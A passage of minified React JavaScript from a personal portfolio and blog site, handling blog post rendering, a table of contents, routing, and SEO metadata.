0:m.innerText)??h.innerText;navigator.clipboard.writeText(S).then(()=>{w.textContent="Copied",setTimeout(()=>w.textContent="Copy",1500)})}),h.appendChild(w)}),()=>{c=!0}},[l]),y.jsx("div",{className:"prose",ref:o,dangerouslySetInnerHTML:{__html:l}})}function jh({markdown:a}){const o=me.useMemo(()=>Ah(a),[a]),[l,d]=me.useState(""),[c,h]=me.useState(!1);return me.useEffect(()=>{if(!o.length)return;const w=new IntersectionObserver(S=>{const m=S.filter(P=>P.isIntersecting).sort((P,T)=>P.boundingClientRect.top-T.boundingClientRect.top);m[0]&&d(m[0].target.id)},{rootMargin:"0px 0px -70% 0px"});return o.forEach(S=>{const m=document.getElementById(S.id);m&&w.observe(m)}),()=>w.disconnect()},[o]),o.length<3?null:y.jsxs("nav",{className:`toc${c?" toc-open":""}`,"aria-label":"Table of contents",children:[y.jsx("button",{className:"toc-toggle",type:"button","aria-expanded":c,onClick:()=>h(w=>!w),children:"On this page"}),y.jsx("ul",{children:o.map(w=>y.jsx("li",{className:w.depth===3?"toc-sub":"",children:y.jsx("a",{href:`#${w.id}`,className:l===w.id?"toc-active":"",onClick:()=>h(!1),children:w.text})},w.id))})]})}function Lh({slug:a}){const o=Pf(a);if(!o)return y.jsx("main",{className:"container",children:y.jsxs("section",{className:"card",children:[y.jsx("h2",{children:"Not found"}),y.jsxs("p",{children:["No blog post named ",y.jsx("code",{children:a}),". ",y.jsx(at,{to:"/blog",children:"Back to all posts"}),"."]})]})});const{prev:l,next:d}=Cf(a);return y.jsx("main",{className:"container",children:y.jsxs("article",{className:"card post",children:[y.jsx(at,{to:"/blog",className:"back-link",children:"← All posts"}),y.jsxs("header",{className:"post-header",children:[y.jsx("h1",{children:o.meta.title}),y.jsxs("p",{className:"post-meta",children:[dl(o.meta.date)," · ",o.meta.readingTime," min read"]}),y.jsx("div",{className:"tag-list",children:o.meta.tags.map(c=>y.jsx("span",{className:"tag",children:c},c))})]}),y.jsxs("div",{className:"post-body",children:[y.jsx(jh,{markdown:o.markdown}),y.jsx(Ih,{source:o.markdown})]}),y.jsxs("nav",{className:"post-nav",children:[l?y.jsxs(at,{to:`/blog/${l.slug}`,className:"post-nav-link",children:[y.jsx("span",{children:"← Older"}),y.jsx("strong",{children:l.title})]}):y.jsx("span",{}),d?y.jsxs(at,{to:`/blog/${d.slug}`,className:"post-nav-link post-nav-next",children:[y.jsx("span",{children:"Newer →"}),y.jsx("strong",{children:d.title})]}):y.jsx("span",{})]})]})})}function Nh(){return y.jsx("main",{className:"container",children:y.jsxs("section",{className:"card",children:[y.jsx("h2",{children:"Page not found"}),y.jsxs("p",{children:["That page doesn't exist. ",y.jsx(at,{to:"/",children:"Go home"})," or"," ",y.jsx(at,{to:"/blog",children:"read the blog"}),"."]})]})})}function Zc(a){const o=a.replace(/\.html$/,"").replace(/\/+$/,"")||"/";if(o==="/")return{name:"home"};if(o==="/blog")return{name:"blog-list"};const l=o.match(/^\/blog\/([^/]+)$/);return l?Ct.some(d=>d.slug===l[1])?{name:"blog-post",slug:l[1]}:{name:"not-found"}:{name:"not-found"}}const xn="https://arxhr007.github.io",zh=`${xn}/og-image.png`,Nc={"@context":"https://schema.org","@type":"Person",name:se.name,jobTitle:se.title,email:`mailto:${se.email}`,url:xn,sameAs:[se.links.github,se.links.linkedin,se.links.website]};function Dh(a){const o=Zc(a),l={type:"website",image:zh};if(o.name==="blog-post"){const d=Ct.find(c=>c.slug===o.slug);return{...l,type:"article",title:`${d.title} — ${se.name}`,description:d.description,canonical:`${xn}/blog/${d.slug}`,jsonLd:{"@context":"https://schema.org","@type":"BlogPosting",headline:d.title,description:d.description,datePublished:d.date,keywords:d.tags.join(", "),author:{"@type":"Person",name:se.name,url:xn},mainEntityOfPage:`${xn}/blog/${d.slug}`}}}return o.name==="blog-list"?{...l,title:`Blog — ${se.name}`,description:"Security research, malware analysis, and reverse engineering write-ups by Aaron Thomas.",canonical:`${xn}/blog`,jsonLd:Nc}:{...l,title:`${se.name} — ${se.title}`,description:"Backend Engineer and Full-Stack Developer. Production backends, REST APIs, PostgreSQL and Firebase data models, and AWS deployments.",canonical:`${xn}/`,jsonLd:Nc}}function Mh(a){document.title=a.title;const o=(d,c)=>{let h=document.head.querySelector(d);h||(h=document.createElement(Object.keys(c)[0]==="rel"?"link":"meta"),document.head.appendChild(h));for(const[w,S]of Object.entries(c))h.setAttribute(w,S)};o('meta[name="description"]',{name:"description",content:a.description}),o('link[rel="canonical"]',{rel:"canonical",href:a.canonical}),o('meta[property="og:type"]',{property:"og:type",content:a.type}),o('meta[property="og:title"]',{property:"og:title",content:a.title}),o('meta[property="og:description"]',{property:"og:description",content:a.description}),o('meta[property="og:url"]',{property:"og:url",content:a.canonical}),o('meta[property="og:image"]',{property:"og:image",content:a.image}),o('meta[name="twitter:card"]',{name:"twitter:card",content:"summary_large_image"}),o('meta[name="twitter:title"]',{name:"twitter:title",content:a.title}),o('meta[name="twitter:description"]',{name:"twitter:description",content:a.description}),o('meta[name="twitter:image"]',{name:"twitter:image",content:a.image});let l=document.head.querySelector('script[type="application/ld+json"]');l||(l=document.createElement("script"),l.setAttribute("type","application/ld+json"),document.head.appendChild(l)),l.textContent=JSON.stringify(a.jsonLd)}function Oh(){const{path:a}=cl(),o=Zc(a);me.useEffect(()=>{Mh(Dh(a))},[a]);let l;return o.name==="home"?l=y.jsx(bf,{}):o.name==="blog-list"?l=y.jsx(Af,{}):o.name==="blog-post"?l=y.jsx(Lh,{slug:o.slug}):l=y.jsx(Nh,{}),y.jsx(vf,{children:l})}function $h({location:a}){return y.jsx(of,{location:a,children:y.jsx(Oh,{})})}const sl=document.getElementById("root"),zc=y.jsx(me.StrictMode,{children:y.jsx($h,{})});sl.hasChildNodes()?_c.hydrateRoot(sl,zc):_c.createRoot(sl).render(zc);
